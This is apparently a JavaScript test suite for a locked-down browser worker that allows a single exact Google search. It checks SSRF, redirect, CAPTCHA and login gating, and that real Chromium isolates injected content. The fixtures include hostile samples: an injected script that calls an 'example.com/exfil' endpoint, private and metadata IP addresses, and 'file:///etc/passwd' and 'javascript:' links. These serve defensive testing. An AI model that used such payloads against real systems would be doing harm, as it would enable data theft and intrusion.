import test from 'node:test';
import assert from 'node:assert/strict';
import {EventEmitter} from 'node:events';
import {createHash} from 'node:crypto';
import {mkdtemp,rm,mkdir,readFile} from 'node:fs/promises';
import {spawn} from 'node:child_process';
import {setTimeout as delay} from 'node:timers/promises';
import {join} from 'node:path';
import {tmpdir} from 'node:os';
import {BrowserSession, BrowserGateError, exactPublicSearchUrl, isPublicSearchIpv4,
  resolvePublicSearchAddress, fetchPinnedPublicSearch, displayedSearchTarget} from '../src-tauri/lu-core/workers/lu_browser_worker.mjs';

const url='https://www.google.com/search?q=Rust%20programming%20language';
const ip='142.250.80.4';
const publicDns=async()=>[{address:ip,family:4}];
const html='<html><body><div><a href="https://www.rust-lang.org/"><h3>Rust programming language</h3></a><p>Build reliable software.</p></div></body></html>';
function transportMock({status=200,body=html,headers={'content-type':'text/html'},complete=true}={}){
  const calls=[];
  const request=(opts,onResponse)=>{
    calls.push(opts);
    const req=new EventEmitter();req.destroy=()=>{};
    req.end=()=>queueMicrotask(()=>{
      const res=new EventEmitter();res.destroy=()=>{};res.statusCode=status;res.headers=headers;
      res.complete=complete;onResponse(res);res.emit('data',Buffer.from(body));res.emit('end');
    });return req;
  };return {calls,request};
}
test('only one exact Google search query is permitted',()=>{
  assert.equal(exactPublicSearchUrl(url).href,url);
  for(const bad of [url+'&q=other',url+'&private=secret',url+'#secret',url.replace('/search','/url'),url.replace('www.google.com','127.0.0.1'),'https://www.google.com/search?q=%00','https://www.google.com/search?q=','https://www.google.com/search?q='+ 'a'.repeat(513)])assert.throws(()=>exactPublicSearchUrl(bad),BrowserGateError,bad);
});
test('special-use DNS addresses and mixed sets fail closed before connection',async()=>{
  for(const addr of ['0.0.0.0','10.1.2.3','127.0.0.1','169.254.169.254','100.100.100.200','172.31.0.1','192.168.0.1','192.0.2.1','192.88.99.1','198.18.0.1','198.51.100.2','203.0.113.4','224.0.0.1','240.0.0.1','::1','::ffff:127.0.0.1','2001:db8::1'])assert.equal(isPublicSearchIpv4(addr),false,addr);
  assert.equal(isPublicSearchIpv4(ip),true);
  const mock=transportMock();
  await assert.rejects(fetchPinnedPublicSearch(url,{resolve:async()=>[{address:ip,family:4},{address:'127.0.0.1',family:4}],request:mock.request}),e=>e.code==='PUBLIC_SEARCH_PRIVATE_ADDRESS');
  assert.equal(mock.calls.length,0);
  await assert.rejects(resolvePublicSearchAddress(async()=>{throw Error('DNS outage')}),e=>e.code==='PUBLIC_SEARCH_OFFLINE');
});
test('provider transport pins one address with TLS hostname and no ambient credentials',async()=>{
  const mock=transportMock();let lookups=0;
  const evidence=await fetchPinnedPublicSearch(url,{resolve:async(host,options)=>{lookups++;assert.equal(host,'www.google.com');assert.equal(options.family,4);return publicDns();},request:mock.request});
  assert.equal(lookups,1);assert.equal(mock.calls.length,1);
  const options=mock.calls[0];assert.equal(options.method,'GET');assert.equal(options.hostname,'www.google.com');assert.equal(options.servername,'www.google.com');assert.equal(options.rejectUnauthorized,true);assert.equal(options.agent,false);assert.equal(options.path,'/search?q=Rust%20programming%20language');
  assert.deepEqual(Object.keys(options.headers).sort(),['Accept','Accept-Encoding','User-Agent']);
  options.lookup('www.google.com',{all:true},(err,values)=>{assert.equal(err,null);assert.deepEqual(values,[{address:ip,family:4}]);});
  options.lookup('private.example',{},err=>assert.ok(err));
  assert.equal(evidence.bodySha256,createHash('sha256').update(html).digest('hex'));
});
test('redirects, throttling, non-HTML, oversized and incomplete content produce no evidence',async()=>{
  for(const [fixture,code] of [
    [{status:302,headers:{location:'https://169.254.169.254/private'}},'PUBLIC_SEARCH_REDIRECT_BLOCKED'],
    [{status:307,headers:{location:'https://www.google.com/search?q=changed'}},'PUBLIC_SEARCH_REDIRECT_BLOCKED'],
    [{status:429},'PUBLIC_SEARCH_CAPTCHA_REQUIRED'],[{status:503},'PUBLIC_SEARCH_HTTP_ERROR'],
    [{headers:{'content-type':'application/octet-stream'}},'PUBLIC_SEARCH_INVALID_RESPONSE'],
    [{headers:{'content-type':'text/html','content-encoding':'gzip'}},'PUBLIC_SEARCH_INVALID_RESPONSE'],
    [{body:'a'.repeat(2*1024*1024+1)},'PUBLIC_SEARCH_RESPONSE_TOO_LARGE'],
    [{complete:false},'PUBLIC_SEARCH_INVALID_RESPONSE']]){
    const mock=transportMock(fixture);
    await assert.rejects(fetchPinnedPublicSearch(url,{resolve:publicDns,request:mock.request}),e=>e.code===code);
    assert.equal(mock.calls.length,1);
  }
});
test('displayed Google redirect links are unwrapped as data, never followed',()=>{
  assert.equal(displayedSearchTarget('/url?q=https%3A%2F%2Fwww.rust-lang.org%2F&sa=U',url),'https://www.rust-lang.org/');
  for(const link of ['javascript:alert(1)','file:///etc/passwd','https://127.0.0.1/','https://test.internal/','https://[::1]/','https://user:pass@example.com/','/url?q=https://example.com&url=https://other.example'])assert.equal(displayedSearchTarget(link,url),null,link);
});
// Opt-in real Chromium, with a controlled provider response. This is not
// Google connectivity or installed OS worker-custody acceptance.
const realModule=process.env.LU_CP04B_PLAYWRIGHT_MODULE;
async function withRealSearchBrowser(fetcher,run){
  const {chromium}=await import(realModule);
  const profile=await mkdtemp(join(tmpdir(),'lu-cp04b-real-'));
  const searchProfile=join(profile,'lu-browser-public-search-profile');await mkdir(searchProfile);
  const child=spawn(process.env.LU_CP04B_CHROMIUM||'/usr/bin/chromium',[
    '--headless=new',...(process.getuid?.()===0?['--no-sandbox']:[]),'--no-first-run','--disable-background-networking',
    '--disable-sync','--host-resolver-rules=MAP * ~NOTFOUND','--remote-debugging-port=0',
    '--remote-debugging-address=127.0.0.1','--user-data-dir='+searchProfile,'about:blank'],{stdio:'ignore'});
  let session;
  try{
    let endpoint;for(let i=0;i<100&&!endpoint;i++){
      try{const port=(await readFile(join(searchProfile,'DevToolsActivePort'),'utf8')).split('\n')[0];if(/^[0-9]+$/.test(port))endpoint='http://127.0.0.1:'+port;}catch{}
      if(!endpoint)await delay(50);
    }
    assert.ok(endpoint,'real local CDP startup');
    session=new BrowserSession({origins:['https://www.google.com'],profileDirectory:searchProfile,chromiumProvider:chromium,
      cdpEndpoint:endpoint,visibilityMode:'always-visible',...(fetcher?{publicSearchFetcher:fetcher}:{})});
    await session.start();await run(session);
  }finally{try{await session?.close();}finally{child.kill();await new Promise(resolve=>{if(child.exitCode!==null||child.signalCode!==null)resolve();else child.once('exit',resolve);});await rm(profile,{recursive:true,force:true,maxRetries:5,retryDelay:100});}}
}
const fixtureFetcher=html=>async value=>{assert.equal(value,url);const body=Buffer.from(html);return {body,status:200,bodySha256:createHash('sha256').update(body).digest('hex')};};
test('public-search profile fails closed without CDP and exact provider',()=>{
  const profileDirectory=join(tmpdir(),'lu-browser-public-search-profile');
  assert.throws(()=>new BrowserSession({origins:['https://www.google.com'],profileDirectory}),e=>e.code==='PUBLIC_SEARCH_ISOLATION_UNAVAILABLE');
  assert.throws(()=>new BrowserSession({origins:['https://example.com'],profileDirectory,cdpEndpoint:'http://127.0.0.1:9222'}),e=>e.code==='PUBLIC_SEARCH_PROVIDER_NOT_GRANTED');
});
test('real Chromium isolated rendering, network denial and immutable source receipt', {skip:!realModule,timeout:30000},async()=>{
  const hostile=html.replace('</body>','<script>fetch("https://example.com/exfil");document.body.innerHTML="INJECTED"</script><img src="https://127.0.0.1/private"><iframe src="https://www.google.com/search?q=stolen"></iframe><form action="https://www.google.com/search?q=stolen"><input name="q" value="private"></form></body>');
  let fetchCalls=0;
  await withRealSearchBrowser(async value=>{fetchCalls++;return fixtureFetcher(hostile)(value);},async session=>{
    await assert.rejects(session.execute({op:'read'}),e=>e.code==='PUBLIC_SEARCH_SCOPE_EXHAUSTED');
    const nav=await session.execute({op:'navigate',url});assert.equal(nav.status,'SEARCH_OBSERVED',JSON.stringify(nav));
    assert.equal(nav.publicSearch.resultCount,1);assert.equal(fetchCalls,1);
    const read=await session.execute({op:'read'});assert.deepEqual(read.publicSearch,nav.publicSearch);assert.equal(read.publicSearch.observedSha256,createHash('sha256').update(read.text).digest('hex'));assert.match(read.text,/Rust programming language/);assert.match(read.text,/Displayed link \(not opened\): https:\/\/www.rust-lang.org\//);assert.doesNotMatch(read.text,/INJECTED|private/);
    const {page}=session;
    assert.equal(await page.evaluate(async()=>{try{await fetch('https://www.google.com/search?q=unauthorized');return 'UNEXPECTED_NETWORK';}catch{return 'DENIED';}}),'DENIED');
    await assert.rejects(page.goto('https://www.google.com/search?q=unauthorized',{timeout:3000}));
    assert.equal(fetchCalls,1);
    await assert.rejects(session.execute({op:'navigate',url:'https://www.google.com/search?q=changed'}),e=>e.code==='PUBLIC_SEARCH_SCOPE_EXHAUSTED');
    await assert.rejects(session.execute({op:'type',text:'private'}),e=>e.code==='PUBLIC_SEARCH_SCOPE_EXHAUSTED');
  });
});
for(const [label,body,reason] of [
  ['CAPTCHA',html.replace('</body>','<iframe src="https://hcaptcha.com/challenge"></iframe></body>'),'PUBLIC_SEARCH_CAPTCHA_REQUIRED'],
  ['Google challenge link',html.replace('</body>','<a href="/sorry/index?continue=opaque">Continue</a></body>'),'PUBLIC_SEARCH_CAPTCHA_REQUIRED'],
  ['login',html.replace('</body>','<input type="password"></body>'),'PUBLIC_SEARCH_LOGIN_REQUIRED'],
  ['consent',html.replace('</body>','Before you continue to Google</body>'),'PUBLIC_SEARCH_CONSENT_REQUIRED'],
  ['JavaScript interstitial','<html><body><a href="/httpservice/retry/enablejs?sei=opaque">Click here</a><script>location.reload()</script></body></html>','PUBLIC_SEARCH_PROVIDER_SCRIPT_REQUIRED'],
  ['empty provider result','<html><body>Service available but no results.</body></html>','PUBLIC_SEARCH_NO_RESULTS']]){
  test(`real Chromium rejects ${label} without a usable search receipt`,{skip:!realModule,timeout:30000},async()=>{
    await withRealSearchBrowser(fixtureFetcher(body),async session=>{
      const nav=await session.execute({op:'navigate',url});assert.equal(nav.status,'SEARCH_UNAVAILABLE');assert.equal(nav.reason,reason);
      assert.equal(nav.diagnostic.schema,'lu-public-search-structure-v1');
      assert.equal(nav.diagnostic.bodySha256,createHash('sha256').update(body).digest('hex'));
      assert.deepEqual(Object.keys(nav.diagnostic).sort(),['anchors','bodyBytes','bodySha256','candidates','h3','httpStatus','legacyHeadings','roleHeadings','schema','scripts'].sort());
      await assert.rejects(session.execute({op:'read'}),e=>e.code==='PUBLIC_SEARCH_SCOPE_EXHAUSTED');
      await assert.rejects(session.execute({op:'human_resolved'}),e=>e.code==='PUBLIC_SEARCH_SCOPE_EXHAUSTED');
    });
  });
}
test('real Chromium recognizes alternate organic heading layouts without accepting arbitrary links', {skip:!realModule,timeout:30000},async()=>{
  const alternate=`<html><body><nav><a href="https://example.com/nav"><h3>Navigation only</h3></a></nav>
    <div class="Gx5Zad"><a href="/url?q=https%3A%2F%2Fdoc.rust-lang.org%2F"><div class="BNeawe vvjwJb">Rust Book</div></a><div class="BNeawe s3v9rd">Learn Rust.</div></div>
    <div><a href="https://www.rust-lang.org/"><div role="heading" aria-level="3">Rust language</div></a><p>Build reliable software.</p></div>
    <div><h3><a href="https://crates.io/">Rust packages</a></h3><p>Package registry.</p></div>
    <div hidden><a href="https://example.com/hidden"><h3>Hidden link</h3></a></div>
    <a href="https://example.com/unrelated">Unrelated link</a></body></html>`;
  await withRealSearchBrowser(fixtureFetcher(alternate),async session=>{
    const nav=await session.execute({op:'navigate',url});assert.equal(nav.status,'SEARCH_OBSERVED',JSON.stringify(nav));
    assert.equal(nav.publicSearch.resultCount,3);
    const read=await session.execute({op:'read'});
    for(const value of ['Rust Book','Learn Rust.','Rust language','Build reliable software.','Rust packages','Package registry.'])assert.ok(read.text.includes(value),value);
    assert.doesNotMatch(read.text,/Navigation only|Hidden link|Unrelated link/);
    assert.equal(read.publicSearch.observedSha256,createHash('sha256').update(read.text).digest('hex'));
  });
});
// Opt-in non-fixture provider gate. A network failure or challenge is an
// explicit failure, never a passing test pretending to verify live content.
test('live Google provider must return genuine bounded results',{skip:!realModule||process.env.LU_CP04B_LIVE_PUBLIC_SEARCH!=='1',timeout:45000},async()=>{
  await withRealSearchBrowser(undefined,async session=>{
    const nav=await session.execute({op:'navigate',url});assert.equal(nav.status,'SEARCH_OBSERVED',JSON.stringify(nav));
    const read=await session.execute({op:'read'});assert.equal(read.status,'READ');assert.deepEqual(read.publicSearch,nav.publicSearch);
    assert.ok(read.publicSearch.resultCount>0);assert.equal(read.publicSearch.observedSha256,createHash('sha256').update(read.text).digest('hex'));
  });
});
